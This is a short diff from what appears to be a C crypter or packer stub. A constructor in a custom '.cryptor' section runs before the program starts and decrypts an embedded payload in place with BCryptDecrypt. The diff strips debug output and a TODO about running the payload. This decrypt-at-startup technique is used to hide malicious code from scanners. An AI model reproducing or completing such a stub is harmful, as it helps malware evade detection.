@@ -293,40 +293,11 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	
 	payload_size = addr_e-addr_s;
 	ptr_payload = (BYTE*)addr_s;
-	printf("size: %x\naddress: %p\ndecodedIV: %p", payload_size,ptr_payload,decodedIV );
-
-	printf("\n");
-	
-	/*{
-		BYTE* tempIV = malloc(AESKEYLEN);
-		memcpy(tempIV, decodedIV,AESKEYLEN);
-		if(BCryptEncrypt(decryptPayloadKey,ptr_payload,payload_size,NULL,tempIV,sz,ptr_payload,payload_size,&PAYLOAD_WRITE_LEN,0) != STATUS_SUCCESS)
-		{	
-			printf("failed to decrypt payload");
-			exit(-1);
-		}
-	}
-	
-	payload_size = addr_e-addr_s;
-	ptr_payload = (BYTE*)addr_s;
-	printf("size: %x\naddress: %p", payload_size,ptr_payload);
-*/
 	if(BCryptDecrypt(decryptPayloadKey,ptr_payload,payload_size,NULL,decodedIV,sz,ptr_payload,payload_size,&PAYLOAD_WRITE_LEN,0) != STATUS_SUCCESS)
 	{
 			printf("failed to decrypt payload");
 		exit(-1);
 	}	
-	printf("\n");
-	for(int x = 0 ; x < payload_size; x++)
-	{
-		printf("%02x ", *(ptr_payload+x));
-	}
-	printf("\n");
-	//if(BCryptDeriveKey
-	/** TODO
-	 *  DECYPT PAYLOAD
-	 *  RUN PAYLOAD
-	 */
 	return 0;
 }
 
